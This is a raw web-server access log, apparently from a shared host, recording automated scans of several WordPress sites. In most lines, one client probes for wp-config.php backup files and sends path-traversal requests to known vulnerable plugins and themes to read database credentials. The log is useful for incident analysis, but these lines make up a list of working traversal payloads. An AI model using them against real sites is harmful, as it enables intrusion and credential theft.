43.133.72.69 www.monsite.com - [03/Jun/2024:06:00:35 +0200] "GET / HTTP/1.1" 301 - "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
43.133.72.69 monsite.com - [03/Jun/2024:06:00:38 +0200] "GET / HTTP/1.1" 200 5982 "http://www.monsite.com" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
43.155.183.138 www.example.fr - [03/Jun/2024:06:40:27 +0200] "GET / HTTP/1.1" 200 2124 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
157.173.193.241 example.info - [03/Jun/2024:07:45:19 +0200] "GET / HTTP/1.1" 200 253 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
157.173.193.241 example.info - [03/Jun/2024:07:45:20 +0200] "GET /wp-includes/wlwmanifest.xml HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
157.173.193.241 example.info - [03/Jun/2024:07:45:20 +0200] "GET /xmlrpc.php?rsd HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
157.173.193.241 example.info - [03/Jun/2024:07:45:21 +0200] "GET /blog/wp-includes/wlwmanifest.xml HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
157.173.193.241 example.info - [03/Jun/2024:07:45:21 +0200] "GET /web/wp-includes/wlwmanifest.xml HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
157.173.193.241 example.info - [03/Jun/2024:07:45:22 +0200] "GET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
157.173.193.241 example.info - [03/Jun/2024:07:45:22 +0200] "GET /website/wp-includes/wlwmanifest.xml HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
157.173.193.241 example.info - [03/Jun/2024:07:45:23 +0200] "GET /wp/wp-includes/wlwmanifest.xml HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
157.173.193.241 example.info - [03/Jun/2024:07:45:23 +0200] "GET /news/wp-includes/wlwmanifest.xml HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
157.173.193.241 example.info - [03/Jun/2024:07:45:24 +0200] "GET /2018/wp-includes/wlwmanifest.xml HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
157.173.193.241 example.info - [03/Jun/2024:07:45:24 +0200] "GET /2019/wp-includes/wlwmanifest.xml HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
157.173.193.241 example.info - [03/Jun/2024:07:45:25 +0200] "GET /shop/wp-includes/wlwmanifest.xml HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
157.173.193.241 example.info - [03/Jun/2024:07:45:25 +0200] "GET /wp1/wp-includes/wlwmanifest.xml HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
157.173.193.241 example.info - [03/Jun/2024:07:45:26 +0200] "GET /test/wp-includes/wlwmanifest.xml HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
157.173.193.241 example.info - [03/Jun/2024:07:45:27 +0200] "GET /media/wp-includes/wlwmanifest.xml HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
157.173.193.241 example.info - [03/Jun/2024:07:45:27 +0200] "GET /wp2/wp-includes/wlwmanifest.xml HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
157.173.193.241 example.info - [03/Jun/2024:07:45:29 +0200] "GET /site/wp-includes/wlwmanifest.xml HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
157.173.193.241 example.info - [03/Jun/2024:07:45:29 +0200] "GET /cms/wp-includes/wlwmanifest.xml HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
157.173.193.241 example.info - [03/Jun/2024:07:45:29 +0200] "GET /sito/wp-includes/wlwmanifest.xml HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
179.43.191.18 example.fr - [03/Jun/2024:07:46:32 +0200] "POST /xmlrpc.php HTTP/1.1" 404 196 "https://example.fr/xmlrpc.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
213.186.33.50 monsite.com - [03/Jun/2024:07:56:24 +0200] "POST /wp-cron.php?doing_wp_cron=1717394183.9937899112701416015625 HTTP/1.1" 200 25 "http://monsite.com/wp-cron.php?doing_wp_cron=1717394183.9937899112701416015625" "WordPress/6.0.8; http://monsite.com"
141.255.162.220 monsite.com - [03/Jun/2024:07:56:23 +0200] "GET / HTTP/1.1" 200 27242 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
51.68.11.239 monsite.com - [03/Jun/2024:07:56:24 +0200] "GET / HTTP/1.1" 200 5975 "https://monsite.com/" "WordPress/6.0.8; http://monsite.com"
141.255.162.220 monsite.com - [03/Jun/2024:07:56:24 +0200] "GET /wp-admin/admin-ajax.php?action=duplicator_download&file=%2F..%2Fwp-config.php HTTP/1.1" 400 1 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
141.255.162.220 monsite.com - [03/Jun/2024:07:56:24 +0200] "GET /wp-config.php.bak HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
141.255.162.220 monsite.com - [03/Jun/2024:07:56:24 +0200] "GET /wp-admin/admin-ajax.php?action=revslider_show_image&img=..%2Fwp-config.php HTTP/1.1" 400 1 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
141.255.162.220 monsite.com - [03/Jun/2024:07:56:24 +0200] "GET /wp-config.php~ HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
141.255.162.220 monsite.com - [03/Jun/2024:07:56:24 +0200] "GET /wp-config.php.save HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
141.255.162.220 monsite.com - [03/Jun/2024:07:56:24 +0200] "GET /wp-config.php.old HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
141.255.162.220 monsite.com - [03/Jun/2024:07:56:24 +0200] "GET /wp-config.phpe HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
141.255.162.220 monsite.com - [03/Jun/2024:07:56:24 +0200] "GET /wp-config.php_old HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
141.255.162.220 monsite.com - [03/Jun/2024:07:56:24 +0200] "GET /?aam-media=wp-config.php HTTP/1.1" 200 27242 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
141.255.162.220 monsite.com - [03/Jun/2024:07:56:24 +0200] "GET /wp-config.phpOLD HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
141.255.162.220 monsite.com - [03/Jun/2024:07:56:24 +0200] "GET /wp-config.php_ HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
141.255.162.220 monsite.com - [03/Jun/2024:07:56:24 +0200] "GET /wp-config.php1 HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
141.255.162.220 monsite.com - [03/Jun/2024:07:56:24 +0200] "GET /wp-config.php.backup HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
141.255.162.220 monsite.com - [03/Jun/2024:07:56:24 +0200] "GET /wp-config.php.org HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
141.255.162.220 monsite.com - [03/Jun/2024:07:56:25 +0200] "GET /wp-content/plugins/cherry-plugin/admin/import-export/download-content.php?file=..%2F..%2F..%2F..%2F..%2Fwp-config.php HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
141.255.162.220 monsite.com - [03/Jun/2024:07:56:25 +0200] "GET /wp-config HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
141.255.162.220 monsite.com - [03/Jun/2024:07:56:25 +0200] "GET /wp-config.php-old HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
141.255.162.220 monsite.com - [03/Jun/2024:07:56:25 +0200] "GET /wp-config.old HTTP/1.1" 403 199 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
141.255.162.220 monsite.com - [03/Jun/2024:07:56:25 +0200] "GET /wp-config.php.orig HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
141.255.162.220 monsite.com - [03/Jun/2024:07:56:25 +0200] "GET /wp-config.php_bak HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
141.255.162.220 monsite.com - [03/Jun/2024:07:56:25 +0200] "GET /wp-config.bak HTTP/1.1" 403 199 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
141.255.162.220 monsite.com - [03/Jun/2024:07:56:25 +0200] "GET /wp-content/plugins/multi-plugin-installer/mpi_download.php?filepath=..%2F..%2F..%2F&filename=wp-config.php HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
141.255.162.220 monsite.com - [03/Jun/2024:07:56:25 +0200] "GET /wp-config.php.bk HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
141.255.162.220 monsite.com - [03/Jun/2024:07:56:25 +0200] "GET /wp-config.php2 HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
141.255.162.220 monsite.com - [03/Jun/2024:07:56:25 +0200] "GET /wp-config.php?aam-media=1 HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
141.255.162.220 monsite.com - [03/Jun/2024:07:56:25 +0200] "GET /wp-config.txt HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
141.255.162.220 monsite.com - [03/Jun/2024:07:56:25 +0200] "GET /wp-config.php.bkp HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
141.255.162.220 monsite.com - [03/Jun/2024:07:56:25 +0200] "GET /wp-config.php-bak HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
141.255.162.220 monsite.com - [03/Jun/2024:07:56:25 +0200] "GET /wp-config.php_orig HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
141.255.162.220 monsite.com - [03/Jun/2024:07:56:25 +0200] "GET /wp-config.orig HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
141.255.162.220 monsite.com - [03/Jun/2024:07:56:25 +0200] "GET /wp-config.php.txt HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
141.255.162.220 monsite.com - [03/Jun/2024:07:56:26 +0200] "GET /wp-config.php_bk HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
141.255.162.220 monsite.com - [03/Jun/2024:07:56:26 +0200] "GET /wp-config.php__ HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
141.255.162.220 monsite.com - [03/Jun/2024:07:56:26 +0200] "GET /wp-content/themes/mTheme-Unus/css/css.php?files=..%2F..%2F..%2F..%2Fwp-config.php HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
141.255.162.220 monsite.com - [03/Jun/2024:07:56:26 +0200] "GET /wp-config.php_original HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
141.255.162.220 monsite.com - [03/Jun/2024:07:56:26 +0200] "GET /wp-config.php_backup HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
141.255.162.220 monsite.com - [03/Jun/2024:07:56:26 +0200] "GET /wp-config.php-original HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
141.255.162.220 monsite.com - [03/Jun/2024:07:56:26 +0200] "GET /wp-config.php.original HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
141.255.162.220 monsite.com - [03/Jun/2024:07:56:26 +0200] "GET /wp-config.php- HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
141.255.162.220 monsite.com - [03/Jun/2024:07:56:26 +0200] "GET /wp-config.php HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
141.255.162.220 monsite.com - [03/Jun/2024:07:56:26 +0200] "GET /wp-content/plugins/adaptive-images/adaptive-images-script.php?adaptive-images-settings[source_file]=..%2F..%2F..%2Fwp-config.php HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
141.255.162.220 monsite.com - [03/Jun/2024:07:56:26 +0200] "GET /wp%E2%80%94admin/admin%E2%80%94ajax.php?action=duplicator_download&file=%2F..%2Fwp-config.php HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
141.255.162.220 monsite.com - [03/Jun/2024:07:56:26 +0200] "GET /wp-admin/admin-ajax.php?action=duplicator_download&file=..%2Fwp-config.php HTTP/1.1" 400 1 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
141.255.162.220 monsite.com - [03/Jun/2024:07:56:26 +0200] "GET /wp-config.php-backup HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
141.255.162.220 monsite.com - [03/Jun/2024:07:56:26 +0200] "GET /?mdocs-img-preview=wp-config.php HTTP/1.1" 200 27242 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
141.255.162.220 monsite.com - [03/Jun/2024:07:56:26 +0200] "GET /wp-admin/tools.php?page=backup_manager&download_backup_file=..%2Fwp-config.php HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
141.255.162.220 monsite.com - [03/Jun/2024:07:56:27 +0200] "GET /wp-login.php?redirect_to=http%3A%2F%2Fmonsite.com%2Fwp-admin%2Ftools.php%3Fpage%3Dbackup_manager%26download_backup_file%3D..%252Fwp-config.php&reauth=1 HTTP/1.1" 200 8518 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
141.255.162.220 monsite.com - [03/Jun/2024:07:56:27 +0200] "GET /wp-content/plugins/google-mp3-audio-player/direct_download.php?file=..%2F..%2F..%2Fwp-config.php HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
141.255.162.220 monsite.com - [03/Jun/2024:07:56:27 +0200] "GET /wp-content/plugins/firestats/php/tools/get_config.php HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
141.255.162.220 monsite.com - [03/Jun/2024:07:56:27 +0200] "GET /wp-admin/tools.php?page=backup_manager&download_backup_file=oldBackups%2F..%2F..%2Fwp-config.php HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
141.255.162.220 monsite.com - [03/Jun/2024:07:56:27 +0200] "GET /wp-login.php?redirect_to=http%3A%2F%2Fmonsite.com%2Fwp-admin%2Ftools.php%3Fpage%3Dbackup_manager%26download_backup_file%3DoldBackups%252F..%252F..%252Fwp-config.php&reauth=1 HTTP/1.1" 200 8554 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
141.255.162.220 monsite.com - [03/Jun/2024:07:56:27 +0200] "GET /wp-config.backup HTTP/1.1" 403 199 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
141.255.162.220 monsite.com - [03/Jun/2024:07:56:27 +0200] "GET /wp-config.php.new HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
141.255.162.220 monsite.com - [03/Jun/2024:07:56:27 +0200] "GET /wp-config.php.save.1 HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
141.255.162.220 monsite.com - [03/Jun/2024:07:56:27 +0200] "GET /wordpress/ HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
141.255.162.220 monsite.com - [03/Jun/2024:07:56:27 +0200] "GET /wp-config.php.dist HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
141.255.162.220 monsite.com - [03/Jun/2024:07:56:28 +0200] "GET /wp-config.php0 HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
141.255.162.220 monsite.com - [03/Jun/2024:07:56:28 +0200] "GET /wp-admin/admin-post.php?alg_wc_pif_download_file=..%2F..%2F..%2F..%2F..%2Fwp-config.php HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
141.255.162.220 monsite.com - [03/Jun/2024:07:56:28 +0200] "GET /wp-config.phpbak HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
141.255.162.220 monsite.com - [03/Jun/2024:07:56:28 +0200] "GET /wp-admin/admin.php?page=miwoftp&option=com_miwoftp&action=download&dir=%2F&item=wp-config.php&order=name&srt=yes HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
141.255.162.220 monsite.com - [03/Jun/2024:07:56:28 +0200] "GET /wp-login.php?redirect_to=http%3A%2F%2Fmonsite.com%2Fwp-admin%2Fadmin.php%3Fpage%3Dmiwoftp%26option%3Dcom_miwoftp%26action%3Ddownload%26dir%3D%252F%26item%3Dwp-config.php%26order%3Dname%26srt%3Dyes&reauth=1 HTTP/1.1" 200 8606 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
141.255.162.220 monsite.com - [03/Jun/2024:07:56:28 +0200] "GET /wp-content/themes/authentic/includes/download.php?file=..%2F..%2F..%2F..%2Fwp-config.php HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
141.255.162.220 monsite.com - [03/Jun/2024:07:56:28 +0200] "GET /wp-config.php.1 HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
141.255.162.220 monsite.com - [03/Jun/2024:07:56:28 +0200] "GET /wp-config-sample.php~ HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
141.255.162.220 monsite.com - [03/Jun/2024:07:56:28 +0200] "GET /wp-content/themes/churchope/lib/downloadlink.php?file=..%2F..%2F..%2F..%2Fwp-config.php HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
141.255.162.220 monsite.com - [03/Jun/2024:07:56:28 +0200] "GET /wp-config.php.resetwp_bak HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
141.255.162.220 monsite.com - [03/Jun/2024:07:56:28 +0200] "GET /wp-config.php_1 HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
141.255.162.220 monsite.com - [03/Jun/2024:07:56:28 +0200] "GET /wp-config.php_new HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
141.255.162.220 monsite.com - [03/Jun/2024:07:56:28 +0200] "GET /wp-config.phpn HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
141.255.162.220 monsite.com - [03/Jun/2024:07:56:29 +0200] "GET /wp-config.bkp HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
141.255.162.220 monsite.com - [03/Jun/2024:07:56:29 +0200] "GET /wp-config.php.local HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
141.255.162.220 monsite.com - [03/Jun/2024:07:56:29 +0200] "GET /wp-config.php.dev HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
141.255.162.220 monsite.com - [03/Jun/2024:07:56:29 +0200] "GET /wp-config-backup HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
141.255.162.220 monsite.com - [03/Jun/2024:07:56:29 +0200] "GET /wp-config.org HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
141.255.162.220 monsite.com - [03/Jun/2024:07:56:29 +0200] "GET /wp-content/plugins/wpsite-background-takeover/exports/download.php?filename=..%2F..%2F..%2F..%2Fwp-config.php HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
141.255.162.220 monsite.com - [03/Jun/2024:07:56:29 +0200] "GET /wp-config.php. HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
141.255.162.220 monsite.com - [03/Jun/2024:07:56:29 +0200] "GET /wp-config.phpr HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
141.255.162.220 monsite.com - [03/Jun/2024:07:56:29 +0200] "GET /wp-config.php.disabled HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
141.255.162.220 monsite.com - [03/Jun/2024:07:56:29 +0200] "GET /wp-content/plugins/google-document-embedder/libs/pdf.php?fn=lol.pdf&file=..%2F..%2F..%2F..%2Fwp-config.php HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
